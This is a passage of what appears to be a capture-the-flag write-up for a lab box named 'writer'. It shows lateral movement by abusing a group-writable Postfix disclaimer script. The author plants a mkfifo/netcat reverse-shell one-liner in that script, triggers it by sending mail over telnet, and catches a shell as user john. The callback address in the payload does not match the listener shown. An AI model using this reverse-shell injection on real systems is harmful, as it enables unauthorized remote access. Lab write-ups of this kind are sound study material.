Looking at listening ports reveals that port 25 is listening locally
Using pspy, see that root is copying a script with a cron
```bash
2021/09/27 17:30:01 CMD: UID=0    PID=5463   | /bin/sh -c /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf 
```
Checking out this config file reveals that it contains configurations for the mail service running on this box (port 25)
- It also shows where the config file is for user john 
```
flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```
Now check out the config file for john @ /etc/postfix/disclaimer
- this file is writable for root, which doesn't help, but it's also writable by the group fiter, which user kyle is in
- Don't understand what's going on here super well, but the bang at the top of the file indicates it gets executed
- Insert a reverse shell one-liner and then use telnet to send an email from john to john

One-liner inserted:
```bash
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

[snip]
```
Send the email using telnet:
```bash
kyle@writer:~$ telnet localhost 25
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 writer.htb ESMTP Postfix (Ubuntu)
ehlo writer.htb

[snip]

mail from: john@writer.htb
250 2.1.0 Ok
rcpt to: john@writer.htb
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
hello there
.
250 2.0.0 Ok: queued as 1D1947E5
```
Call back on netcat:
```bash
-> % nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.102] from (UNKNOWN) [10.10.11.101] 36442
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```
